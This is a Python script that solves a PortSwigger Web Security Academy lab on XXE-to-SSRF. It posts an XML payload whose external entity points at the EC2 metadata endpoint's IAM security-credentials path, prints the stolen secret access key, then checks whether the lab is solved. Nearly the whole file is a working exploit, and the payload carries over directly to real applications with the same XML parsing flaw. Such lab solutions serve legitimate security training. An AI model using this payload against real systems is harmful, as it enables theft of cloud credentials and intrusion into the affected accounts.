#!/usr/bin/env python


'''This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

Lab link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
'''

import requests


lab_id = '0a750004031b9069823fe8c7007600e3' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock" 

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;
</productId><storeId>1</storeId></stockCheck>''' # XXE requests were chained together to get the above path to the iam credential file

header = { "Content-Type" : "application/xml"}

r = requests.post(uri, data=payload, headers=header)
print(r.text)
r2 = requests.get(f"https://{lab_id}.web-security-academy.net")
if "Congratulations" in r2.text:
    print("solved")
else:
    print("nope")
    print(r.text)